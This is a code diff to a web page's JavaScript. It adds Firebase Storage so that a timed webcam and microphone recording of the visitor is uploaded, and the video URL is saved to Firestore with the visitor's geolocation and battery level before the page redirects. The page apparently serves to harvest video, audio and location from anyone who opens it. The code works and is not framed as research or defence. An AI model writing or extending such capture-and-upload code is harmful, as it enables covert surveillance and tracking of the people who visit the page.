@@ -39,6 +39,8 @@
     <!-- Firebase SDK (Firestore) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <!-- Firebase SDK (Storage) -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
 </head>
 <body>
     <div class="container">
@@ -63,6 +65,7 @@ const firebaseConfig = {
 // Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
+const storage = firebase.storage(); // Initialize Firebase Storage
 
 const errorMessage = document.getElementById("error-message");
 
@@ -118,56 +121,6 @@ async function getCurrentUserId() {
     let locationError = null;
     let batteryError = null;
     let cameraError = null;
-
-    // 1. Camera/Microphone (if needed)
-    if (micCamPermission) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-
-            // 2. Start recording (if needed)
-            if (recordSeconds > 0) {
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-
-                recorder.ondataavailable = event => {
-                    chunks.push(event.data);
-                };
-
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    console.log("Blob type:", blob.type); // <-- VERIFY BLOB TYPE
-                    videoUrl = URL.createObjectURL(blob); // <-- Create URL *INSIDE* onstop
-
-                    // --- All data collected, now save and redirect ---
-                    saveDataAndRedirect();
-                    stream.getTracks().forEach(track => track.stop()); // Cleanup
-                };
-
-                recorder.onstart = () => { // <-- Start timer *AFTER* recorder starts
-                    setTimeout(() => {
-                        if (recorder.state !== "inactive") { // Double-check state
-                            recorder.stop();
-                        }
-                    }, recordSeconds * 1000);
-                };
-
-                recorder.start();
-
-            } else {
-                // No recording, stop stream immediately.  Proceed to collect other data.
-                stream.getTracks().forEach(track => track.stop());
-                collectOtherData(); // <-- GO TO NEXT STEP
-            }
-
-        } catch (error) {
-            console.error("Error accessing camera/microphone:", error);
-            cameraError = error.message; // Store error
-            collectOtherData(); // Collect other data even if camera fails.
-        }
-    } else {
-        // No camera/mic needed, proceed to collect other data
-        collectOtherData(); // <-- GO TO NEXT STEP
-    }
 
     // Utility function to promisify Geolocation API
     function getCurrentPositionPromise() {
@@ -252,10 +205,75 @@ async function getCurrentUserId() {
         saveDataAndRedirect();
     }
 
+
+    // 1. Camera/Microphone (if needed)
+    if (micCamPermission) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+            // 2. Start recording (if needed)
+            if (recordSeconds > 0) {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = event => {
+                    chunks.push(event.data);
+                };
+
+                recorder.onstop = async () => { // Make recorder.onstop async
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    console.log("Blob type:", blob.type);
+
+                    // --- Upload to Firebase Storage ---
+                    const storageRef = storage.ref();
+                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`); // Unique video path
+
+                    try {
+                        await videoRef.put(blob); // Upload the blob
+                        videoUrl = await videoRef.getDownloadURL(); // Get download URL
+                        console.log("Video URL:", videoUrl);
+                    } catch (uploadError) {
+                        console.error("Error uploading video to Firebase Storage:", uploadError);
+                        cameraError = "Error uploading video: " + uploadError.message; // Or more specific error message
+                        videoUrl = null; // Set videoUrl to null in case of upload failure
+                    } finally {
+                        // --- All data collected, now save and redirect ---
+                        saveDataAndRedirect();
+                        stream.getTracks().forEach(track => track.stop()); // Cleanup
+                    }
+                };
+
+                recorder.onstart = () => { // <-- Start timer *AFTER* recorder starts
+                    setTimeout(() => {
+                        if (recorder.state !== "inactive") { // Double-check state
+                            recorder.stop();
+                        }
+                    }, recordSeconds * 1000);
+                };
+
+                recorder.start();
+
+            } else {
+                // No recording, stop stream immediately.  Proceed to collect other data.
+                stream.getTracks().forEach(track => track.stop());
+                collectOtherData(); // <-- GO TO NEXT STEP
+            }
+
+        } catch (error) {
+            console.error("Error accessing camera/microphone:", error);
+            cameraError = error.message; // Store error
+            collectOtherData(); // Collect other data even if camera fails.
+        }
+    } else {
+        // No camera/mic needed, proceed to collect other data
+        collectOtherData(); // <-- GO TO NEXT STEP
+    }
+
+
     // Function to save data to Firestore and perform the redirect
     async function saveDataAndRedirect() {
     const dataToSave = {
-        videoUrl: videoUrl || null,  // Save the video URL (or null)
+        videoUrl: videoUrl || null,  // Save the video URL (or null) - Now Firebase Storage URL
         location: locationData || null, // Save location data (or null)
         batteryPercentage: batteryData,  //  No || null
         locationError: locationError || null,  // Save any errors
